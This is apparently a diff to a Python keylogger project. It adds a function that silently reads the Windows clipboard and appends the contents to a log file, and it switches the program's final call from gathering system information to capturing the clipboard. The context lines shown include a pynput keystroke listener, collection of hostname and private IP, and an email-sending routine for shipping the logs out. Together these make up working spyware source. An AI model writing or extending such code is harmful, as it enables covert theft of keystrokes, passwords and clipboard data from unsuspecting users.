@@ -9,6 +9,7 @@ import smtplib
 import socket
 import platform
 
+import clipboard as clipboard
 import win32clipboard
 
 from pynput.keyboard import Key, Listener
@@ -37,6 +38,7 @@ from PIL import ImageGrab
 # """)
 keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
+clipboard_information = "clipboard.txt"
 
 file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
 extend = "\\"
@@ -66,6 +68,18 @@ def computer_information():
         f.write("Machine Information: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPAddr + "\n")
+
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, 'a') as f:
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: " + pasted_data + "\n")
+        except:
+            f.write("Clipboard cannot be copied" + "\n")
 
 
 def send_email(filename, attachment, to_addr):
@@ -126,4 +140,5 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
 # send_email(keys_information, file_path + extend + keys_information, toaddress)
-computer_information()
+# computer_information()
+copy_clipboard()
